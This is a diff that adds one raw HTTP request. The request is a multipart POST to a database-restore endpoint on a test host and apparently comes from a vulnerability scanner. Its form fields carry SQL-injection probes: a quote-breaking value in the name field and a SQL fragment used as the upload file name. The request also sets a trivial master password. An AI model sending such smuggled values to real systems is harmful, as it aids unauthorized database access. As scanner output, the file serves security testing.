@@ -1,0 +1,29 @@
+POST /web/database/restore HTTP/1.1
+Content-Length: 429
+Content-Type: multipart/form-data; boundary=-----Boundary_CYDDYVJGQK
+Referer: http://aidaweb-test.ddns.net:80/
+Cookie: session_id=8278b757f94243123967bc4292a3e571f8a7eb2a; Path=/; website_lang=es_PE
+Host: aidaweb-test.ddns.net
+Connection: Keep-alive
+Accept-Encoding: gzip,deflate
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Accept: */*
+
+-------Boundary_CYDDYVJGQK
+Content-Disposition: form-data; name="copy"
+
+true
+-------Boundary_CYDDYVJGQK
+Content-Disposition: form-data; name="master_pwd"
+
+1
+-------Boundary_CYDDYVJGQK
+Content-Disposition: form-data; name="name"
+
+1'"
+-------Boundary_CYDDYVJGQK
+Content-Disposition: form-data; name="backup_file"; filename="(select convert(int,CHAR(65)))"
+Content-Type: image/png
+
+
+-------Boundary_CYDDYVJGQK--
